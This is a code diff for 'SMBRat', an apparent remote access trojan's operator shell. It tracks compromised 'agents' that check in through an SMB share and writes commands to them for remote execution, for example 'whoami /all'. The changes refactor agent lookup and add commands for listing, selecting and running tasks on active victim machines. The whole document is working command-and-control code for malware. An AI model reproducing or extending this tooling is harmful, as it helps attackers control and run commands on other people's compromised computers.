@@ -16,26 +16,30 @@ INFO_DAT = 'info.dat'
 CHECKIN_DAT = 'checkin.dat'
 Share = None
 
-Sessions = dict(default = dict())
+Sessions = dict()
 
 
 class CLIArgumentParser( argparse.ArgumentParser ) :
-	def exit(self, ex_code = 1, message = "Unrecognised") :
-		# print message
-		# print '[!] [EXIT] - ', ex_code, message
-		return
+	def exit(self, ex_code = 1, message = "Unrecognised") : return
 
-	# def error(self, message) : print (message)
 
-def get_path(project, agent, file = INFO_DAT):
+def get_path(agent, project = None, file = INFO_DAT):
+	if project == None:
+		project = find_project(agent)
 	return Share + os.sep + project + os.sep + agent + os.sep + file
 
 def get_exec_path(project, agent):
-	return Share + os.sep + project + os.sep + agent + os.sep + EXEC_DAT
+	return get_path( agent, project, EXEC_DAT )
 
 def get_output_path(project, agent):
-	return Share + os.sep + project + os.sep + agent + os.sep + OUTPUT_DAT
+	return get_path( agent, project, OUTPUT_DAT )
 
+
+def find_project(agent):
+	for project in Sessions.keys():
+		if agent in Sessions[project].keys():
+			return project
+	raise Error('[!] Project Not Found for Agent "{}"'.format(agent))
 
 def initialize(share_folder) :
 	"""
@@ -76,7 +80,7 @@ def check_active(project, agents = None, timeout = 20):
 	if agents == None:
 		agents = Sessions[project].keys()
 	for agent in agents:
-		agent_ping_path = get_path(project, agent, PING_DAT)
+		agent_ping_path = get_path(agent, project, PING_DAT)
 		now = int(time.time())
 		# Get the Modified Time of "ping.dat" of the Agent
 		mtime = os.stat(agent_ping_path)[-2]
@@ -92,20 +96,18 @@ def check_active(project, agents = None, timeout = 20):
 class SessionHandler(FileSystemEventHandler) :
 
 	def on_created(self, event):
-		# print(event)
-		# if type(event) == DirCreatedEvent :
+		# print(event, event.src_path.endswith(CHECKIN_DAT), CHECKIN_DAT)
 		if event.src_path.endswith(CHECKIN_DAT):
 			# if path of type .../<Share>/<ProjectName>/<Agent-MAC>/checkin.dat
-			if event.src_path.count(os.sep) == 2 :
-				project, agent = event.src_path.split(os.sep)[-3:-1]
-				# MAC characters: len('XX:XX:XX:XX:XX:XX') = 17
-				agent_hostname, agent_mac = agent[:-18], agent[-17:]
-				# print (project, agent_hostname, agent_mac)
-				print ('''
+			project, agent = event.src_path.split(os.sep)[-3:-1]
+			# MAC characters: len('XX:XX:XX:XX:XX:XX') = 17
+			agent_hostname, agent_mac = agent[:-18], agent[-17:]
+			# print (project, agent_hostname, agent_mac)
+			print ('''
 [+] Agent "{}" ({}) just checked-in for Project: "{}"
 '''.format(agent_hostname, agent_mac, project))
-				Sessions[project] = {}
-				Sessions[project][agent] = {}
+			Sessions[project] = {}
+			Sessions[project][agent] = {}
 		# print (Sessions)
 
 
@@ -132,6 +134,7 @@ class SMBRatShell(cmd.Cmd) :
 		self.prompt = 'SMBRat> '
 		self.session_dict = session_dict
 		self.selected = set()
+		self.agent_list = []
 
 	# def do_EOF(self, *args): return ''
 	def emptyline(self, *args): return ''
@@ -140,8 +143,47 @@ class SMBRatShell(cmd.Cmd) :
 		pprint.pprint(self.session_dict)
 		pass
 
-	# Change selected command to agents command
-	def do_selected(self, line): pass
+	def do_selected(self, line): 
+		arg_parser = CLIArgumentParser()
+		arg_parser.add_argument('--add', '-a', help = 'Add an Agent to the "selected" list', nargs = '+', default = [])
+		arg_parser.add_argument('--remove', '-r', help = 'Remove an Agent from the "selected" list', nargs = '+', default = [])
+		arg_parser.add_argument('--clear', '-c', help = 'Remove ALL Agents from the "selected" list',  action = 'store_true')
+		args = arg_parser.parse_args(line.split())
+
+		if args.clear :
+			self.selected = set()
+			return
+
+		arg_list = []
+		if args.add:
+			arg_list.extend(args.add)
+		if args.remove:
+			arg_list.extend(args.remove)
+
+		for i, n_arg in enumerate( arg_list ):
+			try:
+				agent = self.agent_list[int(n_arg)]
+			except :
+				agent = n_arg
+			try:
+				project = find_project(agent)
+			except:
+				print ("Agent '{}' not found".format(agent))
+				continue
+			if i < len(args.add):	# It is an '--add' argument
+				self.selected.add( agent )
+			else:					# It is an '--remove' argument
+				try :
+					self.selected.remove( agent )
+				except :
+					print ("[!] Agent {} not Selected".format(agent))
+
+		if not self.selected:
+			print ("No Agents selected!")
+			return
+		self.onecmd("agents --selected")
+
+
 	def do_agents(self, line):
 		"""
 > agents
@@ -149,72 +191,45 @@ class SMBRatShell(cmd.Cmd) :
 Shows the list of Selected Agents
 
 		"""
-		
 		arg_parser = CLIArgumentParser()
-		arg_parser.add_argument('--add', '-a', help = 'Add an Agent to the "selected" list', nargs = '+')
-		arg_parser.add_argument('--remove', '-r', help = 'Remove an Agent from the "selected" list', nargs = '+')
-		arg_parser.add_argument('--active', help = 'List all active agents', action = 'store_true')
-		arg_parser.add_argument('--selected', '-s', help = 'List all selected agents', action = 'store_true')
-		arg_parser.add_argument('--list', '-l', help = 'List all available agents', action = 'store_true')
+		arg_parser.add_argument('--list', '-l', help = 'Show last Agent List', action = 'store_true')
+		arg_parser.add_argument('--active', '-a', help = 'List all Active Agents', type = int, default = 0, nargs = '?')
+		arg_parser.add_argument('--find', '-f', help = 'Search for a substring in all available Agent names', type = str)
+		arg_parser.add_argument('--selected', '-s', help = 'List all Selected Agents', action = 'store_true')
+		# arg_parser.add_argument('-v', help = 'List all Agents with verbosity', action = 'store_true')
 		args = arg_parser.parse_args(line.split())
-		
-		if args.list:
-			for project in  self.session_dict.keys():
-				for agent in self.session_dict[project].keys():
-					print ("{}/{}".format(project, agent))
-			return
-
-		if args.active:
-			for project in  self.session_dict.keys():
-				active_agents = check_active(project)
-				print ( "=== {}".format(project) )
-				for agent, act_tuple in active_agents.items():
-					print ("[{alive}] {agent} ({last} secs ago)".format(
-						alive = "X" if act_tuple['alive'] else " ",
-						agent = agent,
-						last = int(act_tuple['last'])
-						)
-					)
-
-		if args.add:
-			for add_arg in args.add:
-				# try:
-				# 	int_add_arg = int(add_arg)
-				# except ValueError as ve:
-				if add_arg.count('/') != 1:
-					print("Invalid argument: '{}'. projectName/agent".format(add_arg))
-					continue
-				project, agent = add_arg.split('/', 1)
-				try:
-					self.session_dict[project][agent]
-				except:
-					print ("Agent '{}/{}' not found".format(project, agent))
-					continue					
-				self.selected.add( (project, agent) )
-
-
-		if args.remove:
-			for rem_arg in args.remove:
-				# try:
-				# 	int_rem_arg = int(rem_arg)
-
-				# except ValueError as ve:
-				if rem_arg.count('/') != 1:
-					print("Invalid argument: '{}'. projectName/agent".format(rem_arg))
-					continue
-				project, agent = rem_arg.split('/', 1)
-				try:
-					self.selected.remove( (project, agent) )
-				except:
-					print ("Agent '{}/{}' not found".format(project, agent))
-					continue
+		if args.active == None :	# If --active was set alone
+			args.active = 20		# give it default value
+		elif args.active <= 0 :		# If --active was not set
+			args.active = None		# Turn it to "None"
+		# print (args.active)
 
 		if args.selected:
-			if not self.selected:
-				print ("No agents selected!")
-				return ""
-			for project, agent in self.selected:
-				print ("-> {project}/{agent}".format(project = project, agent = agent))
+			args.list = True
+			self.agent_list = list(self.selected)
+
+		if args.list:
+			for i, agent in enumerate(self.agent_list):
+				print ("{:3}) {}".format(i, agent))
+			return
+		self.agent_list = []
+
+		for project in  self.session_dict.keys():
+			active_agents = check_active(project, timeout = args.active if args.active else 20)
+			print ( "=== {}".format(project) )
+
+			for agent, act_tuple in active_agents.items():
+				if args.active != None:
+					if not act_tuple['alive']:	# if Agent isn't active
+						continue				# Do not print its status
+				print ("[{alive}] {agent} ({last} secs ago)".format(
+					alive = "X" if act_tuple['alive'] else " ",
+					agent = agent,
+					last = int(act_tuple['last'])
+					)
+				)
+				self.agent_list.append(agent)
+		return
 
 
 	def do_execall(self, line):
@@ -230,7 +245,7 @@ Example:
 		allset = set()
 		for project in self.session_dict.keys():
 			for agent in self.session_dict[project].keys():
-				allset.add((project, agent))
+				allset.add( agent )
 
 		self.selected = allset
 		self.do_exec(line)
@@ -245,7 +260,9 @@ Runs the <cmd> to the selected Agents
 Example:
 > exec "whoami /all"
 		"""
-		for project, agent in self.selected:
+		for agent in self.selected:
+			print (agent)
+			project = find_project(agent)
 			exec_path = get_exec_path(project, agent)
 			try :
 				with open(exec_path, 'w+') as exfile:
